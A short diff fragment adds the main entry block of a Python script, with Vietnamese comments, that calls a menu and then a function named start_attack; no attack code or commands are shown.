+# ==================== CHẠY CHƯƠNG TRÌNH ===========================
+if __name__ == "__main__":
+    if menu():
+        start_attack()
+    else:
+        print("[!] Lỗi cấu hình.")
